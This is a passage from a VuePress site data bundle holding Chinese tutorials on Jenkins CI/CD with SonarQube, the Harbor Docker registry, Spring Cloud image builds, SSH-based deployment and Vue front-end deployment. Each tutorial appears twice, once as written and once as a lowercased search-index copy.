jdk版本\nsonar.java.source=1.8\nsonar.java.target=1.8\n# encoding of the source code. default is default system encoding，编码格式\nsonar.sourceencoding=utf-8\n\n4.应用并保存后构建项目\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n5. 流水线项目添加 sonarqube 功能，可以把内容添加到项目中，防止 jenkins 意外的崩溃，导致配置丢失\n\n1. 在项目中根路径下新建 sonar-project.properties，并把内容复制过来\n2. 到项目中的 jenkinsfile 中编写内容\n\npipeline {\n    agent any\n\n    stages {\n        stage(\'pull code\') {\n            steps {\n                echo \'master 分支的事情 参数是=${branch}\'\n                checkout([$class: \'gitscm\', branches: [[name: \'*/${branch}\']], extensions: [], userremoteconfigs: [[credentialsid: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test.git\']]])\n            }\n        }\n        # 代码检查，可以把该步骤添加到任意位置\n        stage(\'code checking\') {\n            steps {\n                script {\n                    # \'\' 这里写的是在jenkins->global tool configuration->sonarqube scanner->新增的sonarqube scanner的name\n                    scannerhome = tool \'sonar-scanner\'\n                }\n                # () 里的内容是在 jenkins->configure system->sonarqube servers->里的 name\n                withsonarqubeenv(\'sonarqube6.7.4\') {\n                    # 这里是 jenkins 在配置 sonarqube scanner的时候安装的工具，他自己安装的不需要我们管\n                    sh "${scannerhome}/bin/sonar-scanner"\n                }\n            }\n        }\n        stage(\'build project\') {\n            steps {\n                sh \'mvn clean package\'\n            }\n        }\n    }\n    post {\n        always {\n            emailext(\n                subject: \'构建通知：${project_name} - build # ${build_number} - ${build_status}!\',\n                body: \'${file,path="email.html"}\',\n                to: \'875730567@qq.com\'\n            )\n        }\n    }\n}\n\n3. 提交后就可以到 jenkins 去构建项目，结果要去 sonarqube web 去看\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n',charsets:{cjk:!0}},{title:"Jenkins(七) Jenkins+Docker+SpringCloud微服务持续集成（上）",frontmatter:{title:"Jenkins(七) Jenkins+Docker+SpringCloud微服务持续集成（上）",date:"2023-06-25T09:22:36.000Z",permalink:"/jenkins/506",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/50.Jenkins/506.Jenkins(%E4%B8%83)%20Jenkins+Docker+SpringCloud%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%EF%BC%88%E4%B8%8A%EF%BC%89.html",relativePath:"01.运维/50.Jenkins/506.Jenkins(七) Jenkins+Docker+SpringCloud微服务持续集成（上）.md",key:"v-a7c74124",path:"/jenkins/506/",headers:[{level:2,title:"Harbor 镜像仓库安装及使用",slug:"harbor-镜像仓库安装及使用",normalizedTitle:"harbor 镜像仓库安装及使用",charIndex:269},{level:3,title:"Harbor 安装",slug:"harbor-安装",normalizedTitle:"harbor 安装",charIndex:734},{level:3,title:"Harbor 使用",slug:"harbor-使用",normalizedTitle:"harbor 使用",charIndex:1263},{level:3,title:"推送到镜像仓库",slug:"推送到镜像仓库",normalizedTitle:"推送到镜像仓库",charIndex:1440},{level:2,title:"微服务构建到docker镜像",slug:"微服务构建到docker镜像",normalizedTitle:"微服务构建到 docker 镜像",charIndex:2148},{level:2,title:"jenkins自动化服务拉取镜像并启动",slug:"jenkins自动化服务拉取镜像并启动",normalizedTitle:"jenkins 自动化服务拉取镜像并启动",charIndex:8540},{level:2,title:"vue 前端使用Jenkins部署",slug:"vue-前端使用jenkins部署",normalizedTitle:"vue 前端使用 jenkins 部署",charIndex:14905}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"Harbor 镜像仓库安装及使用 Harbor 安装 Harbor 使用 推送到镜像仓库 微服务构建到docker镜像 jenkins自动化服务拉取镜像并启动 vue 前端使用Jenkins部署",content:'大致流程说明：\n1. 开发人员每天把代码提交到 Gitlab 代码仓库\n2.Jenkins 从 Gitlab 中拉取项目源码，编译并打成 jar 包，然后构建成 Docker 镜像，将镜像上传到 Harbor 私有仓库。\n3.Jenkins 发送 SSH 远程命令，让生产部署服务器到 Harbor 私有仓库拉取镜像到本地，然后创建容器。\n4. 最后，用户可以访问到容器\n\n> 这里不讲述 Docker 的安装及基础命令的使用，学 dockers 可以看 Docker 概念、命令、DockerFile 等看这篇就够了 这篇文章\n\n\n# Harbor 镜像仓库安装及使用\n\nHarbor（港口，港湾）是一个用于存储和分发 Docker 镜像的企业级 Registry 服务器。除了 Harbor 这个私有镜像仓库之外，还有 Docker 官方提供的 Registry。相对 Registry，Harbor 具有很多优势：\n\n 1. 提供分层传输机制，优化网络传输 Docker 镜像是是分层的，而如果每次传输都使用全量文件 (所以\n    用 FTP 的方式并不适合)，显然不经济。必须提供识别分层传输的机制，以层的 UUID 为标识，确定\n    传输的对象。\n 2. 提供 WEB 界面，优化用户体验 只用镜像的名字来进行上传下载显然很不方便，需要有一个用户界\n    面可以支持登陆、搜索功能，包括区分公有、私有镜像。\n 3. 支持水平扩展集群 当有用户对镜像的上传下载操作集中在某服务器，需要对相应的访问压力作分\n    解。\n 4. 良好的安全机制 企业中的开发团队有很多不同的职位，对于不同的职位人员，分配不同的权限，\n    具有更好的安全性。\n\n\n# Harbor 安装\n\n 1. 除了 docker 以外，还要安装 dockers-compose，Docker Compose 命令及使用 你可以看这篇博客\n 2. 下载 Harbor 的压缩包，地址，需要科式上网，下载完成开始解压\n\ntar -xzf harbor-offline-installer-v1.9.2.tgz\nmv harbor /opt/software/\n# 修改配置文件内容\nvim /opt/software/harbor/harbor.yml \n# 修改hostname\nhostname: 你自己机器的IP\n# 修改端口\nport: 85\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 3. 安装 Harbor\n\ncd /opt/software/harbor\n./prepare\n./install.sh\n\n\n1\n2\n3\n\n 4. 启动 Harbor\n\ndocker-compose up -d 启动\ndocker-compose stop 停止\ndocker-compose restart 重新启动\n\n\n1\n2\n3\n\n 5. 访问 Harbor http://IP:85，默认账户密码：admin/Harbor12345\n\n\n# Harbor 使用\n\n1. 创建项目\nHarbor 的项目分为公开和私有的：\n\n * 公开项目：所有用户都可以访问，通常存放公共的镜像，默认有一个 library 公开项目。\n * 私有项目：只有授权用户才可以访问，通常存放项目本身的镜像。\n\n我们可以为微服务项目创建一个新的项目：\n\n\n\n\n\n2. 用户创建\n\n\n\n3. 为用户分配项目\n\n\n\n\n\n\n# 推送到镜像仓库\n\n# 打标签，命令 docker tag nginx:1.17.1 Harbor的IP:端口/Harbor项目的名称/镜像名字\ndocker tag nginx:1.17.1 192.168.81.102:85/test/nginx:1.17.1\n# 查看\ndocker images\n# 会多一条镜像数据\n192.168.81.102:85/test/nginx         1.17.1                          98ebf73aba75        2 years ago         109MB\n\n\n1\n2\n3\n4\n5\n6\n\n\n把 Harbor 地址加入到 Docker 信任列表\n\n# 编辑docker文件\nvim /etc/docker/daemon.json\n# 加入这句话\n"insecure-registries":["192.168.81.102:85"],\n# 重启配置和docker\nsystemctl restart docker\n# Harbor  的 test 项目是私有的，需要登录\ndocker login -u admin -p Harbor12345 192.168.81.102:85\n# 推送到Harbor仓库里\ndocker push 192.168.81.102:85/test/nginx\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n\n\n\n其他服务下载镜像也需要把地址添加到 docker 的配置文件中，并且也需要使用 docker login 进行登录。复制以下的命令，到其他服务器下执行即可。\n\n\n\n\n# 微服务构建到 docker 镜像\n\n1. 把微服务提交到 SVN\n2. 在 jenkins 上创建一个 Pipelin 类型的 item（项目）\n3. 配置 Pipelin item 的构建时参数\n\n\n\n\n\n\n\n> 这里讲一点，项目中很多的 jar 是有依赖关系的，如果单独打某个服务可能会包找不到依赖，所以建议第一次对根目录进行打包，会把依赖全部加载到 maven 库中，后期单个服务打包即可。\n\n4. 在每个服务的 pom 文件中添加 plugin\n\n\x3c!-- 帮助读取项目中的dockerfile文件，帮我们构建docker镜像 --\x3e\n<plugin>\n    <groupId>com.spotify</groupId>\n    <artifactId>dockerfile-maven-plugin</artifactId>\n    <version>1.3.6</version>\n    <configuration>\n        <repository>${project.artifactId}</repository>\n        \x3c!-- 定义dockerfile 文件的参数 --\x3e\n        <buildArgs>\n            \x3c!-- 定义一个 JAVA_FILE 参数,指为我们项目的名称 --\x3e\n            <JAR_FILE>target/${project.build.finalName}.jar</JAR_FILE>\n        </buildArgs>\n    </configuration>\n</plugin>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n5. 在每个服务的根目录下编写 Dockerfile 文件\n\nFROM openjdk:8-jdk-alpine\n# 这个会读取在pom中声明的变量\nARG JAR_FILE\nCOPY ${JAR_FILE} app.jar\n# 对外端口\nEXPOSE 10086\nENTRYPOINT ["java","-jar","/app.jar"]\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n6. 设置构建后镜像推至镜像仓库\n\n\n\n\n\n\n\n7. 在项目的根目录中编写 Jenkinsfile\n\nnode {\n    // 版本\n    def tag = "1.0"\n    // 镜像仓库的地址\n    def harbor_url = "192.168.81.102:85"\n    // 镜像仓库的项目,这里建议项目名称和jenkins的item项目名称、以及harbor的项目名称保持一致，否则用一下脚本会出问题\n    def harbor_project = "demo"\n\n    // 拉取代码\n    stage(\'pull code\') {\n        checkout([$class: \'GitSCM\', branches: [[name: \'*/${branch}\']], extensions: [], userRemoteConfigs: [[credentialsId: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test.git\']]])\n    }\n    // 编译并推送镜像仓库\n    stage(\'build project\') {\n        if  ("${project_name}" ==  \'demo\' ) {\n            echo \'打包根目录\'\n            sh \'mvn clean package dockerfile:build\'\n        } else {\n            echo  "打包子目录 ${project_name}"\n            sh "mvn -f ${project_name} clean package dockerfile:build"\n        }\n        echo "把jar上传镜像仓库"\n        def oldImageName = "${project_name}:latest"\n        def newImageName = "${harbor_url}/${harbor_project}/${project_name}:${tag}"\n        // 改名称 做规范\n        sh "docker tag ${oldImageName} ${newImageName}"\n        // 删除之前的 镜像\n        sh "docker rmi ${oldImageName}"\n        // 推送到 dockers仓库\n        withCredentials([usernamePassword(credentialsId: \'8a3d7ab1-4cd6-482c-86c9-a12aa6404d98\', passwordVariable: \'harbor_password\', usernameVariable: \'harbor_account\')]) {\n            // 登录\n            sh "docker login -u ${harbor_account} -p ${harbor_password} ${harbor_url}"\n            // 上传\n            sh "docker push ${newImageName}"\n            echo "镜像推送成功"\n        }\n    }\n    // 发送邮件\n    stage(\'send email\') {\n        emailext body: \'\'\'<!DOCTYPE html>\n        <html>\n        <head>\n            <meta charset="UTF-8">\n            <title>${ENV, var="JOB_NAME"}-第${BUILD_NUMBER}次构建日志</title>\n        </head>\n        <body leftmargin="8" marginwidth="0" topmargin="8" marginheight="4" offset="0">\n        <table width="95%" cellpadding="0" cellspacing="0" style="font-size: 11pt; font-family: Tahoma, Arial, Helvetica, sansserif">\n            <tr>\n                <td>(本邮件是程序自动下发的，请勿回复！)</td>\n            </tr>\n            <tr>\n                <td><h2>\n                    <font color="#0000FF">构建结果 - ${BUILD_STATUS}</font>\n                </h2></td>\n            </tr>\n            <tr>\n                <td><br/>\n                    <b><font color="#0B610B">构建信息</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <ul>\n                        <li>项目名称&nbsp;：&nbsp;${PROJECT_NAME}</li>\n                        <li>构建编号&nbsp;：&nbsp;第${BUILD_NUMBER}次构建</li>\n                        <li>触发原因：&nbsp;${CAUSE}</li>\n                        <li>构建日志：&nbsp;\n                            <a href="${BUILD_URL}console">${BUILD_URL}console</a>\n                        </li>\n                        <li>构建&nbsp;&nbsp;Url&nbsp;：&nbsp;\n                            <a href="${BUILD_URL}">${BUILD_URL}</a>\n                        </li>\n                        <li>工作目录&nbsp;：&nbsp;\n                            <a href="${PROJECT_URL}ws">${PROJECT_URL}ws</a>\n                        </li>\n                        <li>项目&nbsp;&nbsp;Url&nbsp;：&nbsp;\n                            <a href="${PROJECT_URL}">${PROJECT_URL}</a>\n                        </li>\n                    </ul>\n                </td>\n            </tr>\n            <tr>\n                <td><b><font color="#0B610B">Changes Since Last Successful Build:</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <ul>\n                        <li>历史变更记录 : <a href="${PROJECT_URL}changes">${PROJECT_URL}changes</a></li>\n                    </ul>\n                    ${CHANGES_SINCE_LAST_SUCCESS,reverse=true, format="Changes for Build #%n:<br/>%c<br/>",showPaths=true,changesFormat="<pre>[%a]<br/>%m</pre>",pathFormat="&nbsp;&nbsp;&nbsp;&nbsp;%p"}\n                </td>\n            </tr>\n            <tr>\n                <td><b>Failed Test Results</b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <pre style="font-size: 11pt; font-family: Tahoma, Arial, Helvetica,sans-serif">\n                        $FAILED_TESTS\n                    </pre>\n                    <br/>\n                </td>\n            </tr>\n            <tr>\n                <td><b><font color="#0B610B">构建日志 (最后 100行):</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <textarea cols="80" rows="30" readonly="readonly"\n                              style="font-family: Courier New">\n                        ${BUILD_LOG,maxLines=100}\n                    </textarea>\n                </td>\n            </tr>\n        </table>\n        </body>\n        </html>\'\'\', mimeType: \'text/html\', subject: \'43243214321\', to: \'875730567@qq.com\'\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n\n\n\n# jenkins 自动化服务拉取镜像并启动\n\n这部操作需要安装一个 Publish Over SSH 插件，安装好后在 Manager Jenkins -> Configure System 进行配置\n\n\n\n更改 Jenkinsfile 脚本，添加远程机器拉取镜像并启动容器，具体语法怎么使用，可以到 流水线语法中查看\n\n\n\nnode {\n    // 版本\n    def tag = "1.0"\n    // 镜像仓库的地址\n    def harbor_url = "192.168.81.102:85"\n    // 镜像仓库的项目,这里建议项目名称和jenkins的item项目名称、以及harbor的项目名称保持一致，否则用一下脚本会出问题\n    def harbor_project = "demo"\n\n    // 拉取代码\n    stage(\'pull code\') {\n        checkout([$class: \'GitSCM\', branches: [[name: \'*/${branch}\']], extensions: [], userRemoteConfigs: [[credentialsId: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test.git\']]])\n    }\n    // 编译并推送镜像仓库\n    stage(\'build project\') {\n        if  ("${project_name}" ==  \'demo\' ) {\n            echo \'打包根目录\'\n            sh \'mvn clean package dockerfile:build\'\n        } else {\n            echo  "打包子目录 ${project_name}"\n            sh "mvn -f ${project_name} clean package dockerfile:build"\n        }\n        echo "把jar上传镜像仓库"\n        def oldImageName = "${project_name}:latest"\n        def newImageName = "${harbor_url}/${harbor_project}/${project_name}:${tag}"\n        // 改名称 做规范\n        sh "docker tag ${oldImageName} ${newImageName}"\n        // 删除之前的 镜像\n        sh "docker rmi ${oldImageName}"\n        // 推送到 dockers仓库\n        withCredentials([usernamePassword(credentialsId: \'8a3d7ab1-4cd6-482c-86c9-a12aa6404d98\', passwordVariable: \'harbor_password\', usernameVariable: \'harbor_account\')]) {\n            // 登录\n            sh "docker login -u ${harbor_account} -p ${harbor_password} ${harbor_url}"\n            // 上传\n            sh "docker push ${newImageName}"\n            echo "镜像推送成功"\n        }\n\n        // 远程调用脚本,port 最好也添加 jenkins项目配置里的参数配置，作为参数传进来\n        echo "执行远程命令 /home/server/deploy.sh ${harbor_url} ${harbor_project} ${project_name} ${tag} ${port}"\n        sshPublisher(publishers: [sshPublisherDesc(configName: \'test_103\', transfers: [sshTransfer(cleanRemote: false, excludes: \'\', execCommand: "/home/server/deploy.sh ${harbor_url} ${harbor_project} ${project_name} ${tag} ${port}", execTimeout: 120000, flatten: false, makeEmptyDirs: false, noDefaultExcludes: false, patternSeparator: \'[, ]+\', remoteDirectory: \'\', remoteDirectorySDF: false, removePrefix: \'\', sourceFiles: \'\')], usePromotionTimestamp: false, useWorkspaceInPromotion: false, verbose: false)])\n\n    }\n    // 发送邮件\n    stage(\'send email\') {\n        emailext body: \'\'\'<!DOCTYPE html>\n        <html>\n        <head>\n            <meta charset="UTF-8">\n            <title>${ENV, var="JOB_NAME"}-第${BUILD_NUMBER}次构建日志</title>\n        </head>\n        <body leftmargin="8" marginwidth="0" topmargin="8" marginheight="4" offset="0">\n        <table width="95%" cellpadding="0" cellspacing="0" style="font-size: 11pt; font-family: Tahoma, Arial, Helvetica, sansserif">\n            <tr>\n                <td>(本邮件是程序自动下发的，请勿回复！)</td>\n            </tr>\n            <tr>\n                <td><h2>\n                    <font color="#0000FF">构建结果 - ${BUILD_STATUS}</font>\n                </h2></td>\n            </tr>\n            <tr>\n                <td><br/>\n                    <b><font color="#0B610B">构建信息</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <ul>\n                        <li>项目名称&nbsp;：&nbsp;${PROJECT_NAME}</li>\n                        <li>构建编号&nbsp;：&nbsp;第${BUILD_NUMBER}次构建</li>\n                        <li>触发原因：&nbsp;${CAUSE}</li>\n                        <li>构建日志：&nbsp;\n                            <a href="${BUILD_URL}console">${BUILD_URL}console</a>\n                        </li>\n                        <li>构建&nbsp;&nbsp;Url&nbsp;：&nbsp;\n                            <a href="${BUILD_URL}">${BUILD_URL}</a>\n                        </li>\n                        <li>工作目录&nbsp;：&nbsp;\n                            <a href="${PROJECT_URL}ws">${PROJECT_URL}ws</a>\n                        </li>\n                        <li>项目&nbsp;&nbsp;Url&nbsp;：&nbsp;\n                            <a href="${PROJECT_URL}">${PROJECT_URL}</a>\n                        </li>\n                    </ul>\n                </td>\n            </tr>\n            <tr>\n                <td><b><font color="#0B610B">Changes Since Last Successful Build:</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <ul>\n                        <li>历史变更记录 : <a href="${PROJECT_URL}changes">${PROJECT_URL}changes</a></li>\n                    </ul>\n                    ${CHANGES_SINCE_LAST_SUCCESS,reverse=true, format="Changes for Build #%n:<br/>%c<br/>",showPaths=true,changesFormat="<pre>[%a]<br/>%m</pre>",pathFormat="&nbsp;&nbsp;&nbsp;&nbsp;%p"}\n                </td>\n            </tr>\n            <tr>\n                <td><b>Failed Test Results</b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <pre style="font-size: 11pt; font-family: Tahoma, Arial, Helvetica,sans-serif">\n                        $FAILED_TESTS\n                    </pre>\n                    <br/>\n                </td>\n            </tr>\n            <tr>\n                <td><b><font color="#0B610B">构建日志 (最后 100行):</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <textarea cols="80" rows="30" readonly="readonly"\n                              style="font-family: Courier New">\n                        ${BUILD_LOG,maxLines=100}\n                    </textarea>\n                </td>\n            </tr>\n        </table>\n        </body>\n        </html>\'\'\', mimeType: \'text/html\', subject: \'43243214321\', to: \'875730567@qq.com\'\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n\n\n重新构建，其他服务器就会自动拉取了。\n\n> 其他服务器一定要有 jenkins 服务器的公钥，构建过程 SSH 不会输出任何信息只会告诉你 EXEC 执行了多久，需要自己去测一下。\n\n\n# vue 前端使用 Jenkins 部署\n\n1. 首先需要安装 NodeJS 插件\n2. 到 Manager Jenkins->Global Tool Configuration->NodeJS\n\n\n\n3. 创建一个流水线的前端项目，根据脚本把配置补全\n\nnode {\n    stage(\'拉取代码\') {\n        checkout([$class: \'GitSCM\', branches: [[name: \'*/${branch}\']], extensions: [], userRemoteConfigs: [[credentialsId: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test_vue.git\']]])\n    }\n    stage(\'打包，部署网站\') {\n        //使用NodeJS的npm进行打包，这个和 以上的 name 保持一致\n        nodejs(\'nodejs12\'){\n            sh \'\'\'\n                npm install\n                npm run build\n            \'\'\'\n        }\n        //=====以下为远程调用进行项目部署========\n        sshPublisher(publishers: [sshPublisherDesc(configName: \'master_server\',transfers: [sshTransfer(cleanRemote: false, excludes: \'\', execCommand: \'\',execTimeout: 120000, flatten: false, makeEmptyDirs: false, noDefaultExcludes:false, patternSeparator: \'[, ]+\', remoteDirectory: \'/usr/share/nginx/html\',remoteDirectorySDF: false, removePrefix: \'dist\', sourceFiles: \'dist/**\')],usePromotionTimestamp: false, useWorkspaceInPromotion: false, verbose: false)])\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n从脚本中可以看出，我们需要一个 branch 参数，还要配置 前端项目的 远程 server 地址\n\n> 这里没有使用 execCommand 的命令，而是通过 sourceFiles、removePrefix、remoteDirectory，sourceFiles 代表我们 copy 哪个文件，remoteDirectory 远程目录，特就是 copy 到 nginx 所在目录\n> 57-62',normalizedContent:'大致流程说明：\n1. 开发人员每天把代码提交到 gitlab 代码仓库\n2.jenkins 从 gitlab 中拉取项目源码，编译并打成 jar 包，然后构建成 docker 镜像，将镜像上传到 harbor 私有仓库。\n3.jenkins 发送 ssh 远程命令，让生产部署服务器到 harbor 私有仓库拉取镜像到本地，然后创建容器。\n4. 最后，用户可以访问到容器\n\n> 这里不讲述 docker 的安装及基础命令的使用，学 dockers 可以看 docker 概念、命令、dockerfile 等看这篇就够了 这篇文章\n\n\n# harbor 镜像仓库安装及使用\n\nharbor（港口，港湾）是一个用于存储和分发 docker 镜像的企业级 registry 服务器。除了 harbor 这个私有镜像仓库之外，还有 docker 官方提供的 registry。相对 registry，harbor 具有很多优势：\n\n 1. 提供分层传输机制，优化网络传输 docker 镜像是是分层的，而如果每次传输都使用全量文件 (所以\n    用 ftp 的方式并不适合)，显然不经济。必须提供识别分层传输的机制，以层的 uuid 为标识，确定\n    传输的对象。\n 2. 提供 web 界面，优化用户体验 只用镜像的名字来进行上传下载显然很不方便，需要有一个用户界\n    面可以支持登陆、搜索功能，包括区分公有、私有镜像。\n 3. 支持水平扩展集群 当有用户对镜像的上传下载操作集中在某服务器，需要对相应的访问压力作分\n    解。\n 4. 良好的安全机制 企业中的开发团队有很多不同的职位，对于不同的职位人员，分配不同的权限，\n    具有更好的安全性。\n\n\n# harbor 安装\n\n 1. 除了 docker 以外，还要安装 dockers-compose，docker compose 命令及使用 你可以看这篇博客\n 2. 下载 harbor 的压缩包，地址，需要科式上网，下载完成开始解压\n\ntar -xzf harbor-offline-installer-v1.9.2.tgz\nmv harbor /opt/software/\n# 修改配置文件内容\nvim /opt/software/harbor/harbor.yml \n# 修改hostname\nhostname: 你自己机器的ip\n# 修改端口\nport: 85\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 3. 安装 harbor\n\ncd /opt/software/harbor\n./prepare\n./install.sh\n\n\n1\n2\n3\n\n 4. 启动 harbor\n\ndocker-compose up -d 启动\ndocker-compose stop 停止\ndocker-compose restart 重新启动\n\n\n1\n2\n3\n\n 5. 访问 harbor http://ip:85，默认账户密码：admin/harbor12345\n\n\n# harbor 使用\n\n1. 创建项目\nharbor 的项目分为公开和私有的：\n\n * 公开项目：所有用户都可以访问，通常存放公共的镜像，默认有一个 library 公开项目。\n * 私有项目：只有授权用户才可以访问，通常存放项目本身的镜像。\n\n我们可以为微服务项目创建一个新的项目：\n\n\n\n\n\n2. 用户创建\n\n\n\n3. 为用户分配项目\n\n\n\n\n\n\n# 推送到镜像仓库\n\n# 打标签，命令 docker tag nginx:1.17.1 harbor的ip:端口/harbor项目的名称/镜像名字\ndocker tag nginx:1.17.1 192.168.81.102:85/test/nginx:1.17.1\n# 查看\ndocker images\n# 会多一条镜像数据\n192.168.81.102:85/test/nginx         1.17.1                          98ebf73aba75        2 years ago         109mb\n\n\n1\n2\n3\n4\n5\n6\n\n\n把 harbor 地址加入到 docker 信任列表\n\n# 编辑docker文件\nvim /etc/docker/daemon.json\n# 加入这句话\n"insecure-registries":["192.168.81.102:85"],\n# 重启配置和docker\nsystemctl restart docker\n# harbor  的 test 项目是私有的，需要登录\ndocker login -u admin -p harbor12345 192.168.81.102:85\n# 推送到harbor仓库里\ndocker push 192.168.81.102:85/test/nginx\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n\n\n\n其他服务下载镜像也需要把地址添加到 docker 的配置文件中，并且也需要使用 docker login 进行登录。复制以下的命令，到其他服务器下执行即可。\n\n\n\n\n# 微服务构建到 docker 镜像\n\n1. 把微服务提交到 svn\n2. 在 jenkins 上创建一个 pipelin 类型的 item（项目）\n3. 配置 pipelin item 的构建时参数\n\n\n\n\n\n\n\n> 这里讲一点，项目中很多的 jar 是有依赖关系的，如果单独打某个服务可能会包找不到依赖，所以建议第一次对根目录进行打包，会把依赖全部加载到 maven 库中，后期单个服务打包即可。\n\n4. 在每个服务的 pom 文件中添加 plugin\n\n\x3c!-- 帮助读取项目中的dockerfile文件，帮我们构建docker镜像 --\x3e\n<plugin>\n    <groupid>com.spotify</groupid>\n    <artifactid>dockerfile-maven-plugin</artifactid>\n    <version>1.3.6</version>\n    <configuration>\n        <repository>${project.artifactid}</repository>\n        \x3c!-- 定义dockerfile 文件的参数 --\x3e\n        <buildargs>\n            \x3c!-- 定义一个 java_file 参数,指为我们项目的名称 --\x3e\n            <jar_file>target/${project.build.finalname}.jar</jar_file>\n        </buildargs>\n    </configuration>\n</plugin>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n5. 在每个服务的根目录下编写 dockerfile 文件\n\nfrom openjdk:8-jdk-alpine\n# 这个会读取在pom中声明的变量\narg jar_file\ncopy ${jar_file} app.jar\n# 对外端口\nexpose 10086\nentrypoint ["java","-jar","/app.jar"]\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n6. 设置构建后镜像推至镜像仓库\n\n\n\n\n\n\n\n7. 在项目的根目录中编写 jenkinsfile\n\nnode {\n    // 版本\n    def tag = "1.0"\n    // 镜像仓库的地址\n    def harbor_url = "192.168.81.102:85"\n    // 镜像仓库的项目,这里建议项目名称和jenkins的item项目名称、以及harbor的项目名称保持一致，否则用一下脚本会出问题\n    def harbor_project = "demo"\n\n    // 拉取代码\n    stage(\'pull code\') {\n        checkout([$class: \'gitscm\', branches: [[name: \'*/${branch}\']], extensions: [], userremoteconfigs: [[credentialsid: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test.git\']]])\n    }\n    // 编译并推送镜像仓库\n    stage(\'build project\') {\n        if  ("${project_name}" ==  \'demo\' ) {\n            echo \'打包根目录\'\n            sh \'mvn clean package dockerfile:build\'\n        } else {\n            echo  "打包子目录 ${project_name}"\n            sh "mvn -f ${project_name} clean package dockerfile:build"\n        }\n        echo "把jar上传镜像仓库"\n        def oldimagename = "${project_name}:latest"\n        def newimagename = "${harbor_url}/${harbor_project}/${project_name}:${tag}"\n        // 改名称 做规范\n        sh "docker tag ${oldimagename} ${newimagename}"\n        // 删除之前的 镜像\n        sh "docker rmi ${oldimagename}"\n        // 推送到 dockers仓库\n        withcredentials([usernamepassword(credentialsid: \'8a3d7ab1-4cd6-482c-86c9-a12aa6404d98\', passwordvariable: \'harbor_password\', usernamevariable: \'harbor_account\')]) {\n            // 登录\n            sh "docker login -u ${harbor_account} -p ${harbor_password} ${harbor_url}"\n            // 上传\n            sh "docker push ${newimagename}"\n            echo "镜像推送成功"\n        }\n    }\n    // 发送邮件\n    stage(\'send email\') {\n        emailext body: \'\'\'<!doctype html>\n        <html>\n        <head>\n            <meta charset="utf-8">\n            <title>${env, var="job_name"}-第${build_number}次构建日志</title>\n        </head>\n        <body leftmargin="8" marginwidth="0" topmargin="8" marginheight="4" offset="0">\n        <table width="95%" cellpadding="0" cellspacing="0" 